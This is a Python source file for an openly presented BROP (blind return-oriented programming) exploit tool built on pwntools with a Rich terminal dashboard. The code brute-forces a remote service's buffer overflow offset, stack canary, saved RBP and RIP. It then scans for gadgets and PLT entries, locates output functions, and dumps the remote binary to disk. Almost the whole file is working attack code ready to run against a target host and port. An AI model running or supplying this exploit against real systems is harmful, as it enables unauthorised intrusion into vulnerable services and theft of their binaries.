"""
Demonstrates a Rich "application" using the Layout and Live classes.
"""

import argparse
from datetime import datetime
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress
from rich.spinner import Spinner
from rich.table import Table

from pwn import *


def parse_args():
    parser = argparse.ArgumentParser(description="Description message")
    parser.add_argument("-t", "--target", default=None, help='target url', required=True)
    parser.add_argument("-p", "--port", default=None, type=int, help='target port', required=True)
    parser.add_argument("--expected-stop", default=None, help='Expected response for the stop gadget', required=True)
    parser.add_argument("--expected", default=None, help='Expected normal response', required=True)
    parser.add_argument("--wait", default=None, help='String to wait before sending payload', required=True)
    parser.add_argument("-o", "--output", default="leaked", help='File to write dumped remote binary', required=True)

    parser.add_argument("--offset", default=None, type=int, help='set a offset value')
    parser.add_argument("--canary", default=None, help='set a canary value')
    parser.add_argument("--no-canary", action="store_false", dest="canary_flag", default=True,  help='Use this argument if there is no stack canary protection')
    parser.add_argument("--rbp", default=None, help='set rbp address')
    parser.add_argument("--rip", default=None, help='set rip address')
    parser.add_argument("--stop", default=None, help='set stop gadget address')
    parser.add_argument("--brop", default=None, help='set brop gadget address')
    parser.add_argument("--plt", default=None, help='set plt address')
    parser.add_argument("--strcmp", default=None, type=int, help='set strcmp entry value')
    parser.add_argument("--elf", default=None, help='set elf address')
    return parser.parse_args()


options = parse_args()

console = Console()

global stop
stop: bool = False

context.log_level = "ERROR"
level = "ERROR"
PIE = False

debug_file = open(f"./debug{datetime.today().strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w")


class BROP:
    def __init__(self, host, port, expected, expected_stop, wait):
        self.r = None
        self.open = False
        self.expected = expected.encode()
        self.expected_stop = expected_stop.encode()
        self.wait = wait
        self.writefunc = "puts"
        # BROP DATA
        self.host = host
        self.port = port
        self.offset = 0
        self.canary = b""
        self.rip = b""
        self.base_addr = b""
        self.rbp = b""
        self.plt = b""
        self.brop = b""
        self.stop_gadget = b""
        self.strcmp = 0
        self.write = 0
        self.fd = 0
        self.elf = b""

    # ## Getter ## #

    def read(self, item):
        if item in dir(self):
            item = self.__getattribute__(item)
            if type(item) is int:
                return str(item)
            else:
                try:
                    return hex(u64(item))
                except struct.error:
                    return str(item)
        else:
            return "ERROR"

    # ## Utils ## #

    def try_exp(self, payload, expected, close: bool = True, reuse: bool = False, retry=False) -> (int, bytes):
        global stop
        crash = True
        try:
            self.r = remote(self.host, self.port) if not reuse or not self.open else self.r
            self.open = True
            self.r.recvuntil({f"{self.wait}"})
            crash = False
            debug(f"# PAYLOAD : \np.send({payload})", append=True, display=False)
            self.r.send(payload)
            content = self.r.recvuntil(expected, timeout=1)
            if close:
                debug(f"# Closing socket", append=True, display=False)
                self.r.close()
                self.open = False
            debug(f"# Received data: {content}", append=True, display=False)
            return content if content else b'\x00'
        except EOFError:
            self.r.close()
            self.open = False
            debug("# Error : EOFError", append=True, display=False)
            if crash:
                print_body("[red bold] Binary crash [/red bold]")
                stop = True
        except pwnlib.exception.PwnlibException as e:
            print_body(f"[red bold] PwnlibException : {e} [/red bold]")
            stop = True
        except Exception as e:
            if not retry:
                return self.try_exp(payload, close, False, True)
            else:
                stop = True
        return 0

    def exec(self, rop: list, expected: bytes = None, close: bool = True, reuse: bool = False):
        if not expected:
            expected = self.expected_stop
        debug(f"# offset = {self.offset}", append=True, display=False)
        payload = b"A" * self.offset
        debug(f"# canary = {self.canary}", append=True, display=False)
        payload += self.canary
        debug(f"# rbp = {self.rbp}", append=True, display=False)
        payload += self.rbp if self.canary != b"" else b""
        debug(f"# rop = {rop}", append=True, display=False)
        payload += b"".join(rop)
        return self.try_exp(payload, expected, close, reuse)

    # ## set register ## #

    def set_rdi(self, rop: list, value: bytes):
        rop.append(p64(u64(self.brop) + 0x9))
        rop.append(value)

    def set_rsi(self, rop: list, value: bytes):
        rop.append(p64(u64(self.brop) + 0x7))
        rop.append(value)
        rop.append(p64(0))

    # ## PLT call ## #

    def set_plt(self, rop: list, entry: int, arg1: bytes, arg2: bytes):
        self.set_rdi(rop, arg1)
        self.set_rsi(rop, arg2)
        self.set_plt_entry(rop, entry)

    def set_plt_entry(self, rop: list, entry: int):
        rop.append(p64(u64(self.plt) + 0xb))
        rop.append(p64(entry))

    def call_plt(self, entry: int, arg1: bytes, arg2: bytes):
        rop = list()
        self.set_plt(rop, entry, arg1, arg2)
        rop.append(self.stop_gadget)
        return self.exec(rop)

    def call_write(self, arg: bytes):
        if self.writefunc == "write":
            rop = list()
            self.set_plt(rop, self.strcmp, self.rip, p64(u64(self.rip) + 1))
            self.set_plt(rop, self.write, p64(self.fd), arg)
            rop.append(self.stop_gadget)
            return self.exec(rop)
        elif self.writefunc == "puts":
            return self.call_plt(self.write, arg, p64(0))
        else:
            return self.call_plt(self.write,p64(self.fd), arg)


    def get_overflow_len(self):
        i = 1
        while i < 1000 and not stop:
            payload = b"A" * i
            res = self.try_exp(payload, self.expected)
            if not res or self.expected not in res:
                print_body(f"[bold][green]✓[/green]found offset :[/bold][green] {i - 1}[/green]")
                self.offset = i - 1
                return
            i += 1

    def leak_stack(self, length=8):
        global stop
        stack = b""
        for i in range(length):
            for j in range(256):
                b = j.to_bytes(1, "big")
                debug(f"Trying byte : [yellow]{b}[/yellow]")
                res = self.exec([stack, b], self.expected)
                if res and self.expected in res:
                    print_body(f"[bold]byte found :[/bold][green] {b}[/green]")
                    stack = stack + b
                    break
                if j == 255:
                    stop = True
                    print_body("[red bold]Unable to leak stack byte[/red bold]")
        return stack

    def leak_canary(self):
        self.canary = self.leak_stack()
        print_body(f"[bold][green]✓[/green]found canary :[/bold][green] {hex(u64(self.canary))}[/green]")

    def leak_rbp(self):
        self.rbp = self.leak_stack()
        print_body(f"[bold][green]✓[/green]found rbp :[/bold][green] {hex(u64(self.rbp))}[/green]")

    def leak_rip(self):
        addr = u64(self.leak_stack())
        self.rip = p64(addr)
        self.base_addr = p64(addr - (addr % 0x1000))
        print_body(f"[bold][green]✓[/green]found rip :[/bold][green] {hex(u64(self.rip))}[/green]")
        print_body(f"[bold][green]✓[/green]found base_addr :[/bold][green] {hex(u64(self.base_addr))}[/green]")

    def get_stop_gadget(self):
        addr = u64(self.base_addr)
        while not stop:
            debug(f"Trying address : [yellow]{hex(addr)}[/yellow]")
            rop = [p64(addr)]
            res = self.exec(rop)
            if res and self.expected_stop in res:
                self.stop_gadget = p64(addr)
                print_body(
                    f"[bold][green]✓[/green]found stop_gadget :[/bold][green] {hex(addr)}[/green]")
                return
            addr += 1

    def get_brop_gadget(self, expected=None):
        addr = u64(self.base_addr)
        while not stop:
            debug(f"Trying address : [yellow]{hex(addr)}[/yellow]")
            if self.rbp:
                rop1 = [p64(addr),
                        self.rbp *2,
                        p64(0) * 4,
                        self.stop_gadget,
                        p64(0) * 10
                        ]
            else:
                rop1 = [p64(addr),
                        p64(0) * 6,
                        self.stop_gadget,
                        p64(0) * 10
                        ]
            res1 = self.exec(rop1)

            rop2 = [p64(addr),
                    p64(0) * 10
                    ]
            res2 = self.exec(rop2)

            if res1 and self.expected_stop in res1 and not res2:
                self.brop = p64(addr)
                print_body(f"[bold][green]✓[/green]found brop gadget :[/bold][green] {hex(addr)}[/green]")
                return
            addr += 1

    def get_plt(self):
        addr = u64(self.base_addr)
        while not stop:
            debug(f"Trying address : [yellow]{hex(addr)}[/yellow]")
            rop1 = [p64(addr),
                    self.stop_gadget,
                    p64(0) * 10]
            res1 = self.exec(rop1)

            rop2 = [p64(addr + 6),
                    self.stop_gadget,
                    p64(0) * 6]
            res2 = self.exec(rop2)

            if res1 and res2 and self.expected_stop in res1 and self.expected_stop in res2:
                self.plt = p64(addr)
                print_body(f"[bold][green]✓[/green]found PLT :[/bold][green] {hex(addr)}[/green]")
                return
            addr += 16

    def get_strcmp(self):
        bad1 = p64(300)
        bad2 = p64(500)
        good = self.rip
        for entry in range(100):
            debug(f"Trying entry : [yellow]{hex(entry)}[/yellow]")
            find = True
            debug(f"    req 1 -> self.call_plt(entry, good, bad2)",append=True,display=False)
            find = find and not self.call_plt(entry, good, bad2)
            debug(f"    req 2 -> self.call_plt(entry, bad1, good)",append=True,display=False)
            find = find and not self.call_plt(entry, bad1, good)
            debug(f"    req 3 -> self.call_plt(entry, good, good)",append=True,display=False)
            res = self.call_plt(entry, good, good)
            find = find and res and self.expected_stop in res

            if find:
                self.strcmp = entry
                print_body(f"[bold][green]✓[/green]found STRCMP :[/bold][green] {entry}[/green]")
                return

    def get_write(self):
        max_fd = 50
        good = p64(u64(self.rip))
        for entry in range(100):
            debug(f"Trying entry : [yellow]{hex(entry)}[/yellow]")
            for fd in range(0, max_fd):
                debug(f"Trying fd : [yellow]{fd}[/yellow]", append=True)
                rop = list()
                self.set_plt(rop,self.strcmp,good,p64(u64(self.rip)+1))
                self.set_plt(rop,entry,p64(fd), good)
                rop.append(self.stop_gadget)

                res = self.call_plt(entry, p64(fd), good)

                res2 = self.call_plt(entry, good, p64(0))

                res3 = self.exec(rop)

                if res and len(res) > 1 and self.expected_stop not in res[:len(self.expected_stop)]:
                    self.write = entry
                    self.fd = fd
                    self.writefunc = "printf"
                    print_body(f"[bold][green]✓[/green]found Printf :[/bold][green] {entry}[/green]")
                    print_body(f"[bold][green]✓[/green]found fd :[/bold][green] {fd}[/green]")
                    return
                elif res2 and len(res2) > 1 and self.expected_stop not in res2[:len(self.expected_stop)]:
                    self.write = entry
                    self.fd = 0
                    self.writefunc = "puts"
                    print_body(f"[bold][green]✓[/green]found Puts :[/bold][green] {entry}[/green]")
                    return
                elif res3 and len(res3) > 1 and self.expected_stop not in res3[:len(self.expected_stop)]:
                    self.write = entry
                    self.fd = fd
                    self.writefunc = "write"
                    print_body(f"[bold][green]✓[/green]found Write :[/bold][green] {entry}[/green]")
                    print_body(f"[bold][green]✓[/green]found fd :[/bold][green] {fd}[/green]")
                    return

    def get_elf_addr(self):
        expected = b"ELF"
        good = self.rip
        for i in range(u64(self.base_addr), 0, -0x100):
            debug(f"Trying address : [yellow]{hex(i)}[/yellow]")
            res = self.call_write(p64(i))
            if res and expected in res:
                print_body(f"[bold][green]✓[/green]found ELF :[/bold][green] {hex(i)}[/green]")
                self.elf = p64(i)
                return
            if stop:
                break

    def get_size(self):
        head = self.dump(100)
        e_shoff = u64(head[40:48])
        e_shentsize = unpack(head[58:60], "all")
        e_shnum = unpack(head[60:62], "all")
        size = e_shoff + (e_shentsize * e_shnum)
        return size

    def dump_all(self):
        size = self.get_size()
        bin = self.dump(size)
        f = open(options.output, "wb")
        f.write(bin)
        f.close()

    def dump(self, size: int):
        stop_addr = u64(self.elf) + size
        addr = u64(self.elf)
        leak = b""
        while addr < stop_addr:
            debug(f"Trying address : [yellow]{hex(addr)}[/yellow]")
            res = self.call_write(p64(addr))
            if res:
                if f"\n{self.expected_stop.decode()}".encode() in res:
                    res = res[:res.rfind(f"\n{self.expected_stop.decode()}".encode())]
                elif self.expected_stop in res:
                    res = res[:res.rfind(self.expected_stop)]
                res = res if res else b'\x00'
                leak += res
                addr += len(res) if res else 1
                print_body(leak[-2000:], replace=True)
        return leak


brop = BROP(options.target, options.port, options.expected, options.expected_stop, options.wait)


# ### END BROP ### #


def make_layout() -> Layout:
    """Define the layout."""
    layout = Layout(name="root")

    layout.split(
        Layout(name="header", size=3),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=7),
    )
    layout["main"].split_row(
        Layout(name="info"),
        Layout(name="body", ratio=2, minimum_size=60),
    )
    layout["info"].split(
        Layout(name="data"),
        Layout(name="debug")
    )
    layout["debug"].split(
        Layout(name="debug_header"),
        Layout(name="debug_body", ratio=4)
    )
    layout["footer"].split_row(Layout(name="all_job"), Layout(name="current_job", ratio=2, minimum_size=60))
    return layout


class Header:
    """Display header with clock."""

    def __rich__(self) -> Panel:
        grid = Table.grid(expand=True)
        grid.add_column(justify="center", ratio=1)
        grid.add_column(justify="right")
        grid.add_row(
            "[b]BROP[/b] exploit app",
            datetime.now().ctime().replace(":", "[blink]:[/]"),
        )
        return Panel(grid, style="white on blue")


tasks = {
    "Offset": brop.get_overflow_len,
    "Canary": brop.leak_canary,
    "RBP": brop.leak_rbp,
    "RIP": brop.leak_rip,
    "Stop gadget": brop.get_stop_gadget,
    "BROP gadget": brop.get_brop_gadget,
    "PLT": brop.get_plt,
    "STRCMP": brop.get_strcmp,
    "WRITE": brop.get_write,
    "ELF": brop.get_elf_addr,
    "DUMP": brop.dump_all,
}

if options.offset:
    tasks.pop("Offset")
    brop.offset = options.offset
if options.canary:
    tasks.pop("Canary")
    brop.canary = p64(int(options.canary[2:], 16))
if options.rbp:
    tasks.pop("RBP")
    brop.rbp = p64(int(options.rbp[2:], 16))
if options.rip:
    tasks.pop("RIP")
    addr = int(options.rip[2:], 16)
    brop.rip = p64(addr)
    brop.base_addr = p64(addr - (addr % 0x1000))

if options.stop:
    tasks.pop("Stop gadget")
    brop.stop_gadget = p64(int(options.stop[2:], 16))
if options.brop:
    tasks.pop("BROP gadget")
    brop.brop = p64(int(options.brop[2:], 16))
if options.plt:
    tasks.pop("PLT")
    brop.plt = p64(int(options.plt[2:], 16))
if options.strcmp:
    tasks.pop("STRCMP")
    brop.strcmp = options.strcmp
if options.elf:
    tasks.pop("ELF")
    brop.elf = p64(int(options.elf[2:], 16))

if not options.canary_flag:
    tasks.pop("Canary")
    tasks.pop("RBP")

total = len(tasks)
overall_progress = Progress()
overall_task = overall_progress.add_task("All Jobs", total=int(total))

overall_panel = Panel(
    overall_progress,
    title="Overall Progress",
    border_style="green",
)


def update_found():
    table = Table()
    table.add_column("Name", justify="right", style="bold", no_wrap=True)
    table.add_column("Value", style="magenta")

    table.add_row("Offset", brop.read("offset"))
    table.add_row("Canary", brop.read("canary"))
    table.add_row("RBP", brop.read("rbp"))
    table.add_row("RIP", brop.read("rip"))
    table.add_row("Base address", brop.read("base_addr"))
    table.add_row("Stop gadget", brop.read("stop_gadget"))
    table.add_row("BROP gadget", brop.read("brop"))
    table.add_row("PLT", brop.read("plt"))
    table.add_row("STRCMP", brop.read("strcmp"))
    table.add_row("WRITE", brop.read("write"))
    table.add_row("FD", brop.read("fd"))
    table.add_row("ELF", brop.read("elf"))

    return table


layout = make_layout()
layout["header"].update(Header())
layout["body"].update(Panel(""))
layout["data"].update(Panel(update_found(), border_style="green", title="BROP data"))
layout["debug_header"].update(Panel("", border_style="red", title="debug"))
layout["debug_body"].update(Panel("", border_style="red", title="data recieved"))
layout["all_job"].update(overall_panel)


def print_body(data, replace=False):
    if replace:
        layout["body"].update(Panel(f"{data}"))
    else:
        layout["body"].update(Panel(f"{data}" + "\n" + layout["body"].renderable.renderable))


def debug(data, append=False, display=True):
    if not append:
        debug_file.write("\n\n" + data + "\n")
    else:
        debug_file.write(data + "\n")
    if not append and display:
        layout["debug_header"].update(Panel(f"{data}", border_style="red", title="debug"))
    elif display and False:
        layout["debug_body"].update(
            Panel(f"{data}" + "\n" + layout["debug_body"].renderable.renderable, border_style="red", title="debug"))


test = """
Follow me on twitter : @Akumarachi
⠀⢀⣠⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⡾⠿⠿⠿⠿⢷⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣿⡟⠛⠛⠛⠻⠿⠿⢿⣶⣶⣦⣤⣤⣀⣀⡀⣀⣴⣾⡿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⡀
⠀⠻⣿⣦⡀⠀⠉⠓⠶⢦⣄⣀⠉⠉⠛⠛⠻⠿⠟⠋⠁⠀⠀⠀⣤⡀⠀⠀⢠⠀⠀⠀⣠⠀⠀⠀⠀⠈⠙⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⢻⣿
⠀⠀⠈⠻⣿⣦⠀⠀⠀⠀⠈⠙⠻⢷⣶⣤⡀⠀⠀⠀⠀⢀⣀⡀⠀⠙⢷⡀⠸⡇⠀⣰⠇⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⡶⠶⠶⠒⠂⠀⠀⣠⣾⠟
⠀⠀⠀⠀⠈⢿⣷⡀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡄⣠⣴⣿⣯⣭⣽⣷⣆⠀⠁⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣦⡀⠀⣠⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⣠⣾⡟⠁⠀
⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀⠀⠀⠀⠀⠀⠀⣿⡗⢻⣿⣧⣽⣿⣿⣿⣧⠀⠀⣀⣀⠀⢠⣿⣧⣼⣿⣿⣿⣿⠗⠰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣶⣄⡀⠀⠀⠀⠀⠸⠃⠈⠻⣿⣿⣿⣿⣿⡿⠃⠾⣥⡬⠗⠸⣿⣿⣿⣿⣿⡿⠛⠀⢀⡟⠀⠀⠀⠀⠀⠀⣀⣠⣾⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣷⣶⣤⣤⣄⣰⣄⠀⠀⠉⠉⠉⠁⠀⢀⣀⣠⣄⣀⡀⠀⠉⠉⠉⠀⠀⢀⣠⣾⣥⣤⣤⣤⣶⣶⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢻⣿⠛⢿⣷⣦⣤⣴⣶⣶⣦⣤⣤⣤⣤⣬⣥⡴⠶⠾⠿⠿⠿⠿⠛⢛⣿⣿⣿⣯⡉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⡀⠈⠉⠀⠈⠁⣾⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⠟⠉⣹⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣿⣿⣦⣀⠀⠀⠀⢻⡀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⠋⣿⠛⠃⠀⣈⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⢿⡀⠈⢹⡿⠶⣶⣼⡇⠀⢀⣀⣀⣤⣴⣾⠟⠋⣡⣿⡟⠀⢻⣶⠶⣿⣿⠛⢯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⡈⢿⣦⣸⠇⢀⡿⠿⠿⡿⠿⠿⣿⠛⠋⠁⠀⣴⠟⣿⣧⡀⠈⢁⣰⣿⠏⠀⠏⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢻⣦⣈⣽⣀⣾⠃⠀⢸⡇⠀⢸⡇⠀⢀⣠⡾⠋⢰⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⢿⣿⣿⡟⠛⠃⠀⠀⣾⠀⠀⢸⡇⠐⠿⠋⠀⠀⣿⢻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠁⢀⡴⠋⠀⣿⠀⠀⢸⠇⠀⠀⠀⠀⠀⠁⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠟⠋⠀⠀⠀⣿⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣁⣀⠀⠀⠀⠀⣿⡀⠀⣿⠀⠀⠀⠀⠀⠀⢀⣈⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
layout["debug_body"].update(Panel(test, border_style="red", title="data recieved"))

completed = 0
with Live(layout, refresh_per_second=40, screen=True):
    for task in tasks:
        try:
            status = Spinner("dots", text=f"Retrieving {task}")
            layout["current_job"].update(Panel(status, title="[b]Jobs", border_style="red"))
            tasks[task]()
            layout["data"].update(Panel(update_found(), border_style="green"))
            completed = completed + 1
            overall_progress.update(overall_task, completed=completed)
            if stop:
                break
        except KeyboardInterrupt:
            break

debug_file.close()
console.print(layout)
